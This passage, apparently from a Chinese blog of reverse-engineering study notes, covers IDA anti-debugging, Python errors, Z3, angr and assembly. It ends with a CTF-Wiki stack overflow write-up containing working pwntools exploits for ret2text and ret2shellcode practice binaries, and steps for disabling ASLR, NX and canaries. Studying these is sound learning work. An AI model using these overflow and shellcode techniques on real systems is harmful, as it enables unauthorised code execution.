    <content type="text"><![CDATA[反调试：插入代码，让程序意识到自己在被调试时，执行代码阻止调试器的分析，延长调试的时间。通过改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试的时间和复杂度。 0X00:IDA中的反反调试F5之后IDA报错，红色显示：”sp-analysis failed”(IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注”sp-analysis failed”。),说明栈指针未平衡。通过”Options-General-Disassembly-“Stack pointer”显示出栈指针。之后Alt+K进行修改，将Call之前的栈指针减去0X04就得到正确的数值。 0X01:花指令插入花指令或者垃圾代码可以保护自己的代码 asm的作用：用于调用内联汇编程序，并且可在 C 或 C++ 语句合法时出现， asm后跟一个程序集指令、一组括在大括号中的指令或者至少一对空大括号。emit指令的作用： 编译器不认识的指令，拆成机器码来写。 插入垃圾字节来反跟踪，又称花指令。 __ams { ​ lea eax,lab1; ​ jmp eax; ​ _emit 0x90; } lab1: ​ printf(“func1\n”); 0X02：某些函数在使用 f5 进行反编译时，会提示错误 “sp-analysis failed”，导致无法正确反编译。原因可能是在代码执行中的 pop、push 操作不匹配，导致解析的时候 esp 发生错误。 解决办法步骤如下： 用 Option-&gt;General-&gt;Disassembly, 将选项 Stack pointer 打钩 仔细观察每条 call sub_xxxxxx 前后的堆栈指针是否平衡 有时还要看被调用的 sub_xxxxxx 内部的堆栈情况，主要是看入栈的参数与 ret xx 是否匹配 注意观察 jmp 指令前后的堆栈是否有变化 有时用 Edit-&gt;Functions-&gt;Edit function…,然后点击 OK 刷一下函数定义]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python's error]]></title>
    <url>%2F2019%2F07%2F18%2FPython-s-error%2F</url>
    <content type="text"><![CDATA[报错1:Exception:Traceback (most recent call last): File “/usr/lib/python2.7/dist-packages/pip/basecommand.py”, line 209, in main status = self.run(options, args) File “/usr/lib/python2.7/dist-packages/pip/commands/install.py”, line 328, in run wb.build(autobuilding=True) File “/usr/lib/python2.7/dist-packages/pip/wheel.py”, line 748, in build self.requirement_set.prepare_files(self.finder) File “/usr/lib/python2.7/dist-packages/pip/req/req_set.py”, line 360, in prepare_files ignore_dependencies=self.ignore_dependencies)) File “/usr/lib/python2.7/dist-packages/pip/req/req_set.py”, line 512, in _prepare_file finder, self.upgrade, require_hashes) File “/usr/lib/python2.7/dist-packages/pip/req/req_install.py”, line 273, in populate_link self.link = finder.find_requirement(self, upgrade) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 442, in find_requirement all_candidates = self.find_all_candidates(req.name) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 400, in find_all_candidates for page in self._get_pages(url_locations, project_name): File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 545, in _get_pages page = self._get_page(location) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 648, in _get_page return HTMLPage.get_page(link, session=self.session) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 757, in get_page “Cache-Control”: “max-age=600”, File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 480, in get return self.request(‘GET’, url, *kwargs) File “/usr/lib/python2.7/dist-packages/pip/download.py”, line 378, in request return super(PipSession, self).request(method, url, *args, *kwargs) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 468, in request resp = self.send(prep, *send_kwargs) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 576, in send r = adapter.send(request, *kwargs) File “/usr/share/python-wheels/CacheControl-0.11.5-py2.py3-none-any.whl/cachecontrol/adapter.py”, line 46, in send resp = super(CacheControlAdapter, self).send(request, **kw) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/adapters.py”, line 376, in send timeout=timeout File “/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/connectionpool.py”, line 610, in urlopen _stacktrace=sys.exc_info()[2]) File “/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/util/retry.py”, line 228, in increment total -= 1TypeError: unsupported operand type(s) for -=: ‘Retry’ and ‘int’ 解决办法:(主要是pip的版本问题引起的) easy_install pip pip install –upgrade pip (此处执行原本要进行的命令) 报错2:AttributeError: ‘module’ object has no attribute ‘b64encode’ import base64出现的报错 原因：.pyc文件出现的问题 解决办法：将base64.py重命名，并删除pyc文件。 Python运行时，会先查找该程序所在路径，是否有相关的模块，有则直接引用。正好该目录下有一个base64.py文件，而这个文件非官方的base64库。 1.什么是pyc文件？ pyc文件是python编译后的字节码文件。Python的程序中，是把原始程序代码放在.py文件里，而Python会在执行.py文件的时候。将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，这么做的目的就是为了加快下次执行文件的速度。 2.Python运行过程 Python是一种解释型语言，每次执行都需要进行一次翻译。执行 python *.py 后，将会启动 Python 的解释器，将 *.py 编译成一个字节码对象 PyCodeObject，存放在内存，当这个模块的 Python 代码执行完之后就会将编译结果保存到 *.pyc文件中，下一次就不需要编译，直接加载到内存中。 a.模块在被导入时会先检查本地目录下是否有pyc文件 b.若有pyc文件，对比py文件的修改时间是否一致，若一致，直接使用pyc文件，若不一致，对py文件进行解释，并将结果覆盖本地的pyc文件 c.若未找到pyc文件，对py文件进行解释，并将结果回写到本地的pyc文件中 重名出现的问题 报错4:python前注释12#!/usr/bin/env python# -*- coding:utf-8 -*- 报错5：IndentationError: unexpected indent 此处有一个意料之外的缩进 IndentationError:expected an indented block 此处需要一个缩进 注意空格与Tab不能混用 报错6：SyntaxError: unexpected EOF while parsing 未验证函数参数是否有效，传入了空的参数。 快速查找python安装路径的方法：打开cmd 12345pythonimport sysprint(sys.path) 打印出来的第四个即python的安装路径。 报错7123456CondaHTTPError: HTTP 000 CONNECTION FAILED for url &lt;https://conda.anaconda.org/conda-forge/win-64/repodata.json&gt;Elapsed: -An HTTP error occurred when trying to retrieve this URL.HTTP errors are often intermittent, and a simple retry will get you on your way.&apos;https://conda.anaconda.org/conda-forge/win-64&apos; 连接国外的服务器超时，要换成国内镜像源。 报错81[WinError 193] %1 不是有效的 Win32 应用程序。 python位数与dll位数不同，需要统一。]]></content>
      <tags>
        <tag>error</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Z3约束求解器]]></title>
    <url>%2F2019%2F07%2F14%2FZ3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E5%99%A8%2F</url>
    <content type="text"><![CDATA[如果高中数学给我们用Z3就好了 0X00:IntroductionZ3求解器给我们提供了一个非常便利求解方式，我们只需要定义未知量（x,y等），然后为这些未知量添加约束方式即可求解。 0X01:基本用法x = Int(‘x’) y = Int(‘y’) solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 首先要定义要求解的几个参数，然后用变量把核心的方程搭建出来，之后就会自动求解，最后打印出来就行。 基本的框架如此，具体的代码还是要多在实际中写。虽然CTF逆向比赛中重点考察的是逆向的能力，采用求解器的方式来求解并不能锻炼到自己的逆向逻辑，自己肝才是大佬。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angr]]></title>
    <url>%2F2019%2F07%2F14%2Fangr%2F</url>
    <content type="text"><![CDATA[0X00:Introductionangr是一个二进制代码分析工具，能够自动化完成二进制文件的分析，并找出漏洞，是一个基于python的二进制漏洞分析框架，它将以前多种分析技术集成进来，­­­它能够进行动态的符号执行分析，也能够进行多种静态分析。 0X01:基本过程 将二进制程序载入angr分析系统 将二进制程序转换成中间语言 将IR语言转换成语义较强的表达形式 执行进一步的分析 0X02：用法angr-CLE：首先加载二进制文件，在加载二进制文件的时候会分析病读取binary的信息，包括指令地址、shared library、arch information等等。 import angr b = angr.Project(“./test”) angr_IR：angr用VEX IR将指令转化为中间语言IRangr-Solver Engine： import claripybv = claripy.BVV(0x41424344, 32) ArchInfoArchinfo是包含特定于体系结构的信息的类的集合。例如，little-endian amd64、little-endian i386。 PyVexPyVex是中间语言，Angr使用Valgrind的中间语言——VEX来完成这方面的内容。VEX中间语言抽象了几种不同架构间的区别，允许在他们之上进行统一的分析。各种中间语言在设计理念上有很多的共通点 SimuVEXSimuVEX模块是中间语言VEX执行的模拟器，它允许你控制符号执行。 Angr是一个很强大的工具，对进行过代码混淆的代码，无法在IDA中反编译，但能够用这个工具。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编]]></title>
    <url>%2F2019%2F07%2F12%2F%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[下学期开课，复习一下。 1.指令与数据在内存中的都是以同样的二进制流存放的，区别之处在于是从哪根总线（数据总线/控制总线）传入。2.地址总线宽度决定CPU的 寻址能力。2的N次方个。数据总线的宽度决定了数据的传输速度。控制总线的宽度决定了控制能力。3.核心思维：从CPU的角度去考虑问题。4.寄存器中，数据是采用的小端序存储。5.AX=AH+AL，EAX是32位寄存器，AX是16位，AH/AL是8位6.汇编指令不区分大小写。7.8226H+8826H，在ax中就会变成044C（本来是1044C），多出来的1会在标志位中显示。注意对AH和AL运算时，不能越界。8.8086的CPU内部结构为16位，只能传送16位的地址，所以寻址能力只有64K。但是其地址总线的宽度为20位，寻址能力有1M。所以采用16位段地址与16位偏移地址，经过地址加法器合并为20位的物理地址后，再进行输出。 9.地址加法器的工作原理：物理地址等于段地址X16（即在末端加上个0，数据左移4位。）再加上偏移地址。10.一个数据的X进制形式左移一位，即相当于乘上X。11.CPU中的内存是连续的，但是人为的划分可以分成段。段地址X16可以得到基础地址，加上偏移地址得到物理地址。12.偏移地址为16位，所以允许的一个段的长度最大为64K。13.CPU可以通过不同的段地址与偏移地址形成一个物理地址。14.数据在一个存储单元中，可以有两种不同的表述：如数据被存储在21F60H的存储单元中，可以表示为”数据在内存2000：1F60H。”也可以表示为”数据在内存的2000段中的1F60H元中。 15.可以根据需要，将一组连续的且起始地址为16倍数的内存空间定义为一个段。16.段寄存器就是提供段地址的，8086CPU有4个段寄存器，分别是CS（code），DS（data),SS(stack),ES(extra)。17.一个宏观的想法：无论是程序还是数据，当其加载到内存中之后，都是一段二进制代码流。其中的一部分由控制总线传入转化成命令，其中的一部由数据总线传入转化成十六进制数据。18.CS与IP，为8086CPU最重要的两个寄存器，指示了CPU当前要读取的指令的地址，CS为代码段寄存器，IP为指针寄存器。 即任意时刻，CPU将CS:IP指向的内容当作指令执行。19.物理地址从地址总线传到内存中后，读取内存单元中存放的指令，指令通过数据总线途经输入输出控制电路，到达指令缓冲器。且读取一条指令后，IP的值会自动增加，使CPU可以读取下一条指令（根据当前读取的指令长度而加上该长度到达下一条指令位置。）。20.能够改变CS/IP内容的指令被称为转移指令；最简单的转移指令：jmp。jmp 段地址：偏移地址，课将CS和IP修改到指定值。同时jmp+某一合法寄存器的值可只修改IP。21.sub，减法运算。sub ax，bx，即为ax-bx。22.内存中字的存储：高位对应高低址位，低位对应低地址位。所以对于一个内存单元中的数，应该从下往上读取。23.字单元：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。24.mov指令还可以将一个内存单元中的内容送入寄存器。mov 寄存器名，内存单元地址。[…]表示偏移地址，另外确定内存单元所需的段地址由DS决定（一致）。将寄存器中的内容送入内存单元表示为：mov […]，寄存器名。25.8086CPU不支持直接将数据写入段寄存器，必须先通过改变其他寄存器的值，然后寄存器与寄存器间进行操作，才能改变段寄存器的值。 指令中只写偏移地址，段地址需要在事先改变。26.mov的用法小结：mov 寄存器，数据/mov 寄存器，寄存器/mov 寄存器，内存单元/mov 内存单元，寄存器/mov 段寄存器，寄存器/mov 寄存器，段寄存器。27.类比代码段得到数据段的定义方法：将某为16倍数的地址作为首地址，不超过64K的长度作为数据段长度，把dx段寄存器改为首地址即可。28.字型数据–&gt;偏移地址差为2位。29.现如今的CPU都有栈的设计，8086CPU提供相关指令以栈的形式访问内存，所以在基于8086CPU编程的时候，可以将一段连续的内存空间作为栈使用。30.从程序化的角度来看，必须有一个指针指向栈最上面的元素。 31.如何知道一段内存空间被当作栈来使用？如何知道接下来要操作的栈中数据哪个是在栈顶的。类似于CS:IP,8086CPU中，SS：IP始终指向栈顶。32.栈顶指针可以指到最底层。33.POP或者PUSH指令，在两种极端情况下都会造成栈溢出。34.栈是一种可以被特殊访问的内存空间。35.PUSH指令和POP指令，可以在内存与寄存器之间传递数据，也可以在寄存器与寄存器之间，内存与内存之间传递数据。由于栈中的操作对象（栈顶指针所指向的字型数据确定，所以在指令中只需写偏移指令或者寄存器名称。36.栈顶清零不能用MOV AX,0。要用SUB AX,AX。 37.将10000H~1000FH的空间当作栈的初始化汇编代码：mov ax,10000Hmov ss,axmov sp,0010H ss是段寄存器，不能被直接赋值。注意后面栈顶指针的指向，实际上已经超出了栈的范围，在栈底的下面一位更高地址。38.push ax是入栈指令，它将在栈顶之上压入新的数据。一定要注意其执行过程是：先将记录栈顶偏移地址的SP减2，使得SS：SP指向新的内存单元，然后再将数据写入内存单元中。39.我们要十分清楚的是：push和pop指令与mov指令不同，CPU执行mov指令只需一步操作，即传送。而执行push指令时，实际上有两步操作：先改变SP的值，后向SS:SP处传送。执行pop指令时，先读取SS:SP的数据，再改变SP的值。 40.为什么栈的长度最大只有64K？与数据总线是16位有关。64X1024=2的16次方。41.数据段没有指针，直接用偏移地址。 42.伪指令，伪指令无法被编译成机器指令被CPU执行，由编译器执行。segments和ends是一对成对使用的伪指令，这是在写可被编译的汇编程序时必须要用到的伪指令。segment和ends的功能是定义一个段，segment说明一个段的开始，ends说明一个段的结束。 段的使用格式：段名 segment： 段名 ends43.一个汇编程序是由多个段组成的，这些段被用来存放代码，数据或者被当作栈空间。一个源程序中，所有将被计算机所处理的信息即指令，数据，栈被划分到不同的段。44.ends与segments配对使用，分别表示段的开始与结束。end与ends是两个不同的概念，end是整个程序的结束。45.assume指令，将有特定用途的段与相关的段寄存器联系起来。比如用assume指令将代码段与CS联系起来。46.源程序：源程序文件当中的所有内容。程序：源程序中最终由计算机处理的指令或者数据。47.与C语言类似，汇编中除了汇编指令，伪指令外，还有标号（段名）会在被编译的时候，转变为内存地址。48.程序返回：一段汇编指令被编译成机器码储存在可执行文件中，要想运行必须载入内存。在dos单个任务操作系统上，必须先有正在运行的程序P1，将CPU的控制权交给P2后，P2才得以运行。所以一个程序结束运行后，必须将CPU控制权交给下一个程序，这个交换的过程成为程序返回。代码：mov ax，4c00Hint 21H49.源程序在编译的过程中被发现的错误称之为语法错误，编译完成后执行时发生的错误为逻辑错误。50.asm，汇编源程序的扩展名。51.源程序被编译后，可以得到obj（目标文件）/lst（列表文件）/crf（交叉引用文件）52.53.要完整地描述一个内存单元，需要两种信息。一是内存单元地地址，二是内存单元存储的长度（数据类型）。用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认存储在ds中，单元的长度类型可以由具体指令中的其他操作对象比如寄存器指出。类似的，[bx]也表示一个内存单元，其偏移地址在bx中。54.（bx）表示bx中的内容。 （）中可以有三种类型，寄存器名，段寄存器名，内存单元的物理地址。 由此可知，（X）中的数据类型有两种，字或者字节。 15.注意push与pop指令对sp操作的先后顺序。56.[idata]，表示数据 57.mov ax，[bx]表示把bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中，将SA:EA处的数据送入ax中。mov [bx],ax表示把bx中存放的数据作为偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处。58.inc表示自增。59.cx与loop指令直接关联，存放循环的次数。60.cx的使用：mov ax，2mov cx，11s：add ax，axloop s可计算2的12次方61.在汇编语言中，标号代表一个地址，此程序中有一个标号（可以是任意字母），用来标识一个地址，这个地址处的指令就是所要循环的指令。62.能否将ffff：0~ffff：b中的数据直接累加到dx中？不能，直接的累加对位数有要求，相同位数的才能够直接相加。解决办法：将ax中的al和ah拆分开来用。63.出现在访问内存单元的指令中，用于显式地知名内存单元的段地址的ds，cs，ss，es，在汇编语言中称为段前缀。使用段前缀可以在某些情况下减少代码的行数。64.在不能确定一段内存空间中是否存放着重要的数据或者代码的时候，不能随意 向其中写入内容。Dos方式下，一般情况，0：200·0：2ff空间中没有系统或者其他程序的数据或者代码。65.lea, load effective address, 加载有效地址. 指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.66.movs/movsb/movsw/movsd edi,esi这些变体以串/字节/字/双字为单位，将esi的值赋给edi。67.movsx符号位扩展，byte-&gt;word，word–&gt;dword（扩展后高位全用符号位填充），然后实现mov。68.movzx零扩展，byte-&gt;word，word-&gt;dword（扩展后高位全部用零填充），然后实现mov。69.CMP指令根据比较两个操作数的结果设置C/O/Z标志位。若两个寄存器中的值相等，则Z标志位置1，否则置零。也可以直接用[地址]与寄存器进行比较。70.逆向工程中常用的三个标志位，C/O/Z，C为进位标志，记录运算时从最高有效位产生的进位值。执行加法运算时，最高有效位有进位时置1，否则置0.O标志位，溢出标志，在运行过程中，如果操作数超出了机器能表示的范围则称为溢出，溢出置1，未溢出置0.Z标志位最常用，运算结果为0时，Z标志位置1，否则置0. 71.XOR异或运算，当两个结果存在不同的时候进行或运算，相同的时候保持不变。NOT,非运算。72.test dest，src指令，与AND指令一样，对两个操作数进行按位的“与”运算，唯一不同的是不将结果保存到dest，不对操作数的内容进行修改，只修改标志位。实际操作中，一般都是test eax，eax，如果eax的值为0，则Z标志位置1.73.各种跳转及其条件：JMP 无条件跳转]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF-Wiki Stack Overflow and ROP]]></title>
    <url>%2F2019%2F06%2F20%2FCTF-Wiki%2F</url>
    <content type="text"><![CDATA[CTF-Wiki中几道例题的思路 从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。 0X01–栈溢出的基本原理： 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。 函数调用指令: CALL(注意理解EBP的变化过程，它指向下一条指令要操作的数据) 大致过程: 参数入栈 返回地址入栈 代码区块跳转 栈帧调整: 保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈) 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部) 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶) 0X02–栈溢出的保护类型： 知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。 Canary：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。编译时的关闭指令：-fno-stack-protector ALSR与PIE(Position Independent Executable)：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功）编译时ALSR的关闭指令：echo 0&gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态，可以用cat+路径显示相关的参数：0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 PIE编译时的关闭指令：-no-pie，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。 Linux平台下的NX,Windows平台上的DEP：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 0X03–编译指令： gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie） sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_space ($ cat /proc/sys/kernel/randomize_va_space指令检查)exit（关闭ALSR)-z execstack（关闭NX保护） test.c -o test(由test.c生成test可执行文件) -g(GDB调试) 0X04–ROP原理： 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ropgadget，注意命令格式：ROPgadget –binary [文件名] –only’寄存器名|寄存器名’ | grep ‘eax’。 0X05–四种类型： 第一种类型ret2text: 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(“You Hava already controlled it.”); &#125;void vulnerable()&#123;char s[12];gets(s);puts(s);return;&#125;int main(int argc, char **argv) &#123;vulnerable();return 0;&#125; 只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。 EXP如下： 123456789101112131415##coding=utf8## 导入pwntools库from pwn import *## 构造与程序交互的对象，sh = process(&apos;./文件名&apos;)表示打本地，日自己。sh = process(&apos;./stack_example&apos;)## 已知了想要执行的函数地址success_addr = 0x0804843b## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)##print可以帮助自己看脚本执行到了哪一步print p32(success_addr)## 向程序发送字符串sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive() 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(“/bin/sh”)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。 123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。 1234567891011121314151617gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);───────────────────────────────────────────────────────────────────────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 断点下在Call处为什么是这个Call处？(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。 每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。 EXP如下： 1234567891011##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2text&apos;)target = 0x0804863ash.sendline(&apos;A&apos; * (0x6c+4) + p32(target))sh.interactive() 我觉得这道题倒是让我弄明白了buf的表示，位置关系。 上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。 第二种类型ret2shellcode： ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。 12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] 通过vmmap观察该bss段是否可执行： 12345678910111213141516171819202122232425262728293031323334gef➤ b mainBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.gef➤ rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:88 setvbuf(stdout, 0LL, 2, 0LL);─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]──── 6 int main(void) 7 &#123; → 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 ─────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0x8048536 → Name: main()─────────────────────────────────────────────────────────────────────────────────────────────────────gef➤ vmmap Start End Offset Perm Path0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rwx [stack] 所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。 EXP如下: 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2shellcode&apos;)## 自动生成shellcodeshellcode = asm(shellcraft.sh())buf2_addr = 0x804a080## shellcode先放入，剩余的再用&apos;A&apos;填充至112长度。sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))sh.interactive() shellcode放进去了不需要别的操作吗？这个buf2_addr指的是什么？如何通过调试确定需要填充的长度？ 第三种类型：ret2syscall：即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。 1execve(&quot;/bin/sh&quot;,NULL,NULL) 由于该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。 具体实现–ropgadgets 这个工具: only ‘pop|ret’ | grep 